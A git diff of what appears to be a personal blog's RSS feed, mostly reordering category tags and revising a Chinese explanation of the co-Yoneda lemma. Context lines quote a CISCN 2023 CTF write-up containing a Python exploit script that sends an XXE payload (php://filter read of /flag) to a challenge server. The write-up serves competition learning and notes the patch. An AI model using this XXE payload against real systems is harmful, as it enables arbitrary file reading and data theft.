@@ -13,11 +13,11 @@ Resume is [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/
         <language>zh-CN</language>
         <pubDate>Mon, 08 Apr 2024 02:38:20 +0800</pubDate>
         <lastBuildDate>Mon, 08 Apr 2024 02:38:20 +0800</lastBuildDate>
-        <category>Misc</category>
-        <category>Write-Up</category>
-        <category>出题</category>
         <category>CISCN</category>
         <category>web</category>
+        <category>Write-Up</category>
+        <category>Misc</category>
+        <category>出题</category>
         <category>Hackergame</category>
         <category>SchoolBus</category>
         <category>Rust</category>
@@ -31,8 +31,8 @@ Resume is [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/
         <category>Stack</category>
         <category>图论</category>
         <category>Kruskal</category>
-        <category>数链剖分</category>
         <category>Splay</category>
+        <category>数链剖分</category>
         <category>持久化</category>
         <category>线段树</category>
         <category>树状数组</category>
@@ -98,7 +98,7 @@ Resume is [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/
 &lt;li&gt;&lt;p&gt;（这里是基于co-Yoneda的叙述，但反正本质上没有区别）一种&lt;a href=&#34;https://bartoszmilewski.com/2015/09/01/the-yoneda-lemma/trackback/&#34;&gt;来自Bartosz Milewski的理解&lt;/a&gt;：任何数据类型 T 都可以被一个函数 f 所取代。f 接受一个T的“处理器”handler（这个handler会把T转成目标类型） 并执行其余计算——即是续延（Continuation）。&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Haskell表述： &lt;code&gt;forall x . (t -&amp;gt; x) -&amp;gt; F x ≅ F t&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;我们可以把函子看成一种广义的容器（参见：&lt;a href=&#34;https://bartoszmilewski.com/2014/01/14/functors-are-containers/trackback/&#34;&gt;Functors are Containers&lt;/a&gt;），所以左边就是把t转成x，然后变成F x这一步只是把x装起来变成可以装x类型的容器而已（我们并不关心这个F对x做了什么，我们关心的是“F对x的确做了些什么”这个事实本身）。假设容器一开始只能装x类型的，但是如果对所有可能的类型x，有handler: t-&amp;gt;x可以转化成一个装有x类型的容器，那么这个容器事实上就是可以装t类型的。&lt;/li&gt;
+&lt;li&gt;我们可以把函子看成一种广义的容器（参见：&lt;a href=&#34;https://bartoszmilewski.com/2014/01/14/functors-are-containers/trackback/&#34;&gt;Functors are Containers&lt;/a&gt;），所以左边就是把t转成x，然后变成F x这一步只是把x装起来变成可以装x类型的容器而已（我们并不关心这个F对x做了什么，我们关心的是“F对x的确做了些什么”这个事实本身——所以把F x当作一个容器好了，只需要把x放进去然后盖上盖子，不去理睬里面发生了什么）。假设容器一开始只能装x类型，但是如果对所有可能的类型x，“装入t类型为F t”这事都能通过handler: t-&amp;gt;x转化为“装入x类型为F x”，那么这个容器事实上就是可以装t类型的。&lt;/li&gt;
 &lt;li&gt;译者的理解是，如果不把&lt;code&gt;F x&lt;/code&gt;看作容器，而是看成类型构造器，那么可以这么解释：基于t构造新类型的实质，就是需要从每个t类型值构造新的F t类型值（所以在这种视角下，没有具体的转换细节，我们只知道有一个新类型F t带来新的关系，这些新的关系从旧关系导出）。对任意可能的类型x，每个t类型值都对应一种自己的&lt;em&gt;转换方式&lt;/em&gt;，使得各个handler: t-&amp;gt;x（某种意义上是关系）分别转化为一个值v，v的类型是基于x构造的新类型F x。 &lt;strong&gt;或者说，每个类型x都可以要求一个能把t值转化为x值的handler，而后用构造器F构造新类型时，就可以从handler这些旧有关系导出新类型F t与其他新类型F x之间的新关系；因为这些handler把类型t的运算细节“包办”了。&lt;/strong&gt; 对于任意类型x，任意的handler都有这种&lt;em&gt;转换方式&lt;/em&gt;（共同构成每个x的自然变换）。因此，应用类型构造器F时，类型t的每个值都会指导形如(t-&amp;gt;…)的handler该如何转换为(F t-&amp;gt;F…)，而这些自然变换构成了t类型存在的全部意义。所有和t有关的运算都可以视为一种类型构造，因此类型t的意义只有在运算中才会得到显现，一个不参与运算（不构造新类型）的类型没有任何存在价值，这符合直觉。&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/li&gt;
@@ -508,9 +508,9 @@ Resume is [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/
             <guid isPermalink="true">http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/</guid>
             <title>CISCN 2023 Write-Up &amp; Tricks</title>
             <link>http://cubicy.icu/2023/07/07/CISCN-Write-Up-Tricks/</link>
-            <category>Write-Up</category>
             <category>CISCN</category>
             <category>web</category>
+            <category>Write-Up</category>
             <pubDate>Fri, 07 Jul 2023 00:28:12 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;CISCN-2023-部分-Write-Up-及patch妙妙小技巧&#34;&gt;&lt;a href=&#34;#CISCN-2023-部分-Write-Up-及patch妙妙小技巧&#34; class=&#34;headerlink&#34; title=&#34;CISCN 2023 部分 Write-Up 及patch妙妙小技巧&#34;&gt;&lt;/a&gt;CISCN 2023 部分 Write-Up 及patch妙妙小技巧&lt;/h1&gt;&lt;h2 id=&#34;Web&#34;&gt;&lt;a href=&#34;#Web&#34; class=&#34;headerlink&#34; title=&#34;Web&#34;&gt;&lt;/a&gt;Web&lt;/h2&gt;&lt;h3 id=&#34;ezphp&#34;&gt;&lt;a href=&#34;#ezphp&#34; class=&#34;headerlink&#34; title=&#34;ezphp&#34;&gt;&lt;/a&gt;ezphp&lt;/h3&gt;&lt;p&gt;变量覆盖+XXE外部实体注入任意文件读。&lt;br&gt;Patch：修了extract就行&lt;br&gt;exp:  &lt;/p&gt;
 &lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;file = &lt;span class=&#34;string&#34;&gt;&amp;quot;/flag&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;username = &lt;span class=&#34;string&#34;&gt;&amp;quot;okok20&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&lt;span class=&#34;subst&#34;&gt;&amp;#123;username&amp;#125;&lt;/span&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;password&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;y&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;#x27;user_xml_format&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;f&amp;quot;&amp;quot;&amp;quot;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&amp;lt;!DOCTYPE ANY [&amp;lt;!ENTITY content SYSTEM &amp;quot;php://filter/read=convert.base64-encode/resource=&lt;span class=&#34;subst&#34;&gt;&amp;#123;file&amp;#125;&lt;/span&gt;&amp;quot;&amp;gt;]&amp;gt;&amp;lt;userinfo&amp;gt;&amp;lt;user&amp;gt;&amp;lt;username&amp;gt;&amp;amp;content;&amp;lt;/username&amp;gt;&amp;lt;password&amp;gt;1&amp;lt;/password&amp;gt;&amp;lt;/user&amp;gt;&amp;lt;/userinfo&amp;gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://175.20.20.196/register.php&amp;quot;&lt;/span&gt;,data=data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r = requests.get(&lt;span class=&#34;string&#34;&gt;f&amp;quot;http://175.20.20.196/login.php?username=&lt;span class=&#34;subst&#34;&gt;&amp;#123;username&amp;#125;&lt;/span&gt;&amp;amp;password=2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(r.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -531,8 +531,8 @@ Resume is [here](https://latexonline.cc/compile?git=https://github.com/cubicYYY/
             <guid isPermalink="true">http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/</guid>
             <title>ACTF2022 - FFSK - Official WriteUp</title>
             <link>http://cubicy.icu/2022/07/03/ACTF2022%20-%20FFSK%20-%20Official%20WriteUp/</link>
-            <category>Misc</category>
             <category>Write-Up</category>
+            <category>Misc</category>
             <category>出题</category>
             <pubDate>Sun, 03 Jul 2022 23:43:00 +0800</pubDate>
             <description><![CDATA[ &lt;h1 id=&#34;FFSK-WriteUp&#34;&gt;&lt;a href=&#34;#FFSK-WriteUp&#34; class=&#34;headerlink&#34; title=&#34;FFSK - WriteUp&#34;&gt;&lt;/a&gt;FFSK - WriteUp&lt;/h1&gt;&lt;p&gt;&lt;del&gt;众所周知歪歪歪英文很烂求轻喷&lt;/del&gt;  &lt;/p&gt;
